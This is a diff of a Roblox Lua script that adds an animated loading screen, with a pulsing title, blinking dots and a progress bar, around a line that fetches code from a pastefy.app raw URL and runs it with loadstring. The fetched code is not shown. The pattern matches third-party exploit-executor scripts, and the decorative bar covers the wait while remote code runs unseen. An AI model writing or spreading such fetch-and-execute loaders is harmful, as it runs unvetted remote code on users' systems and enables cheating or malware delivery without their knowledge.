@@ -1,1 +1,89 @@
-loadstring(game:HttpGet("https://pastefy.app/BLldvDWO/raw"))()
+-- === Настройки ===
+local TOTAL_TIME = 90
+local STEPS = 100
+local player = game.Players.LocalPlayer
+local gui = script.Parent
+local frame = gui:WaitForChild("MainFrame")
+local title = frame:WaitForChild("Title")
+local loadingText = frame:WaitForChild("LoadingText")
+local barFill = frame:WaitForChild("BarFill")
+local scale = barFill:FindFirstChild("UIScale")
+local gradient = barFill:FindFirstChild("UIGradient")
+
+-- === Начальное состояние GUI ===
+gui.Enabled = true
+barFill.Size = UDim2.new(0,0,1,0)
+loadingText.Text = "Loading..."
+
+-- === Анимации GUI ===
+-- Пульсация заголовка
+task.spawn(function()
+    while gui.Enabled do
+        title.TextSize = title.TextSize + 2
+        task.wait(0.2)
+        title.TextSize = title.TextSize - 2
+        task.wait(0.2)
+    end
+end)
+
+-- Мигающие точки "Loading..."
+task.spawn(function()
+    local dots = 0
+    while gui.Enabled do
+        dots = (dots + 1) % 4
+        loadingText.Text = "Loading" .. string.rep(".", dots)
+        task.wait(0.4)
+    end
+end)
+
+-- Вращающийся градиент полосы
+task.spawn(function()
+    while gui.Enabled do
+        if gradient then
+            gradient.Rotation = gradient.Rotation + 1
+        end
+        task.wait(0.02)
+    end
+end)
+
+-- Дыхание прогресс-бара
+task.spawn(function()
+    while gui.Enabled do
+        if scale then
+            scale.Scale = 1.03
+            task.wait(0.4)
+            scale.Scale = 1
+            task.wait(0.4)
+        end
+    end
+end)
+
+-- === Параллельный запуск твоего скрипта ===
+local loadDone = false
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/BLldvDWO/raw"))()
+    loadDone = true
+end)
+
+-- === Основной цикл прогресс-бара ===
+local timePerStep = TOTAL_TIME / STEPS
+for i = 1, STEPS do
+    barFill.Size = UDim2.new(i / 100, 0, 1, 0)
+    
+    -- Если твой скрипт завершился раньше, ускоряем оставшуюся загрузку
+    if loadDone and i < STEPS then
+        -- Остаток до 100% заполняем быстро
+        for j = i+1, STEPS do
+            barFill.Size = UDim2.new(j / 100, 0, 1, 0)
+            task.wait(0.02)
+        end
+        break
+    end
+    
+    task.wait(timePerStep)
+end
+
+-- === Финальное состояние ===
+loadingText.Text = "Ready!"
+task.wait(0.5)
+gui.Enabled = false
